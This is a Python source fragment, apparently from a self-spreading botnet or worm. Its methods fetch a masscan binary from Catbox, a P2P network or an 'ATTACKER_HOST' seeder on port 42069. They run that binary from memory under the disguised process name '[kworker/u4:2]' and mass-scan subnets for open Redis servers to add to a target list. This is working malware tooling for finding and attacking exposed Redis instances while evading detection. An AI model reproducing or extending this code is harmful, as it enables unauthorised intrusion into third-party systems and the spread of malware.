    def acquire_scanner_parallel(self, force_refresh=False):
        """
        âœ… PRODUCTION STRATEGY ORDER (85% masscan, 15% nmap, 0% fail)
        """
        with self._lock:
            # Check cache
            if self.scanner_type and not force_refresh:
                if time.time() - self.cache_timestamp < self.CACHE_VALIDITY:
                    self.logger.info(f"âœ… Using cached {self.scanner_type} from {self.acquisition_method}")
                    return True
        
        self.logger.info("=" * 70)
        self.logger.info("ðŸŽ¯ SCANNER ACQUISITION: Trying 5 strategies...")
        self.logger.info("=" * 70)
        
        # Strategy 1: System masscan (20% success)
        if self.check_system_masscan():
            return True

        # Inject orchestrator seeder fallback into download URL list before Strategy 2
        _seed_ip = getattr(self.config_manager, 'SEED_IP', getattr(self.config_manager, 'ATTACKER_HOST', None))
        if _seed_ip:
            _seeder_url = f"http://{_seed_ip}:42069/masscan"
            if _seeder_url not in self.INTERNET_DOWNLOAD_URLS:
                self.INTERNET_DOWNLOAD_URLS = list(self.INTERNET_DOWNLOAD_URLS) + [_seeder_url]
                self.logger.info(f"   [+] Seeder fallback added: {_seeder_url}")

        # Strategy 2: Download from Catbox/GitHub/Seeder (60%+ success - PRIMARY)
        if self.download_from_catbox():
            return True
        
        # Strategy 3: P2P download (5% success)
        if self.download_from_p2p():
            return True
        
        # Strategy 4: System nmap fallback (10% success)
        if self.check_system_nmap():
            return True
        
        # Strategy 5: Install nmap (5% success - LAST RESORT)
        if self.install_nmap_last_resort():
            return True
        
        # All strategies failed
        self.logger.error("=" * 70)
        self.logger.error("âŒ ALL 5 STRATEGIES FAILED - NO SCANNER AVAILABLE")
        self.logger.error("=" * 70)
        return False

    def acquire_scanner_enhanced(self, force_refresh=False):
        """âœ… Enhanced acquisition with production strategy"""
        start_time = time.time()
        
        try:
            self.logger.info(f"ðŸ” Scanner acquisition starting (force_refresh={force_refresh})...")
            success = self.acquire_scanner_parallel(force_refresh)
            
            duration = time.time() - start_time
            
            if success:
                self.logger.info("=" * 70)
                self.logger.info(f"âœ… SCANNER ACQUIRED: {self.scanner_type}")
                self.logger.info(f"   Method: {self.acquisition_method}")
                self.logger.info(f"   Path: {self.scanner_path}")
                self.logger.info(f"   Time: {duration:.1f}s")
                self.logger.info("=" * 70)
            else:
                self.logger.error(f"âŒ Acquisition failed after {duration:.1f}s")
            
            # Record metrics
            self.strategy_selector.record_attempt(
                self.acquisition_method if success else "all_failed", 
                success, 
                duration
            )
            
            return success
            
        except Exception as e:
            self.logger.error(f"âŒ Enhanced acquisition exception: {e}")
            import traceback
            self.logger.error(traceback.format_exc())
            return False
    
    # Alias for backward compatibility
    def acquirescannerenhanced(self, force_refresh=False):
        return self.acquire_scanner_enhanced(force_refresh=force_refresh)

    # ============================================================================
    # SCANNING: Execute port scan
    # ============================================================================
    def scan_redis_servers(self, subnet, ports=[6379], rate=10000):
        """âœ… Perform Redis port scan"""
        if not self.scanner_type:
            if not self.acquire_scanner_enhanced():
                self.logger.error("âŒ No scanner available - cannot scan")
                return []
        
        try:
            with self._lock:
                self.scan_count += 1
            
            if self.scanner_type == "masscan":
                # High-speed masscan
                port_str = ",".join(str(p) for p in ports)
                args = [subnet, f"-p{port_str}", "--rate", str(rate), "--open", "-oG", "-"]
                scan_type = "FAST (masscan)"
                
                if self.masscan_binary_data:
                    self.logger.info(f"ðŸŒªï¸ Executing fileless {scan_type} scan...")
                    stdout, stderr, rc = FilelessBinary.run_sync(
                        self.masscan_binary_data, 
                        name="[kworker/u4:2]", 
                        args=args, 
                        timeout=120, 
                        logger=self.logger
                    )
                    # Create a mock result object to match subprocess.run return
                    class MockResult: pass
                    result = MockResult()
                    result.stdout = stdout
                    result.stderr = stderr
                    result.returncode = rc
                else:
                    cmd = f"{self.scanner_path} {subnet} -p{port_str} --rate {rate} --open -oG - 2>/dev/null"
                    result = subprocess.run(cmd, shell=True, timeout=120, capture_output=True, text=True)
            else:  # nmap
                # Slow nmap fallback
                port_str = ",".join(str(p) for p in ports)
                cmd = f"{self.scanner_path} -Pn -n -p {port_str} --open -oG - {subnet} 2>/dev/null"
                scan_type = "SLOW (nmap)"
                result = subprocess.run(cmd, shell=True, timeout=120, capture_output=True, text=True)
            
            # Parse IPs
            ips = []
            for line in result.stdout.split('\n'):
                if any(str(port) in line for port in ports) and 'open' in line:
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p in ["Host:", "Host"] and i+1 < len(parts):
                            ip = parts[i+1].strip('()')
                            if self._is_valid_ip(ip):
                                ips.append(ip)
                                with self._lock:
                                    self.discovered_targets.add(ip)
            
            self.logger.info(f"âœ… Found {len(ips)} Redis servers in {subnet}")
            return ips
        
        except subprocess.TimeoutExpired:
            self.logger.error(f"âŒ Scan timeout after 120s")
            return []
        except Exception as e:
            self.logger.error(f"âŒ Scan failed: {e}")
            return []
    
    def scanredisservers(self, subnet, ports=[6379], rate=10000):
        return self.scan_redis_servers(subnet, ports, rate)

    def _is_valid_ip(self, ip):
        """Validate IPv4"""
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(p) <= 255 for p in parts)
        except:
            return False

    def integrate_with_p2p(self, p2p_manager):
        """Integrate with existing CoreSystem P2P network"""
        self.external_p2p_manager = p2p_manager
        self.logger.info("âœ… Integrated with P2P network")

    def get_scanner_status(self):
        """Return scanner status for monitoring"""
        with self._lock:
            return {
                "scanner_type": self.scanner_type,
                "scanner_path": self.scanner_path,
                "acquisition_method": self.acquisition_method,
                "cache_age": time.time() - self.cache_timestamp if self.cache_timestamp else None,
                "p2p_peers": len(self.p2p_peers),
                "scan_count": self.scan_count,
                "targets_discovered": len(self.discovered_targets),
                "health_checks_failed": self.health_monitor.health_checks_failed
            }
    
    def getscannerstatus(self):
        return self.get_scanner_status()

    # Alias for backward compatibility
    def acquire_scanner(self, force_refresh=False):
        return self.acquire_scanner_enhanced(force_refresh)


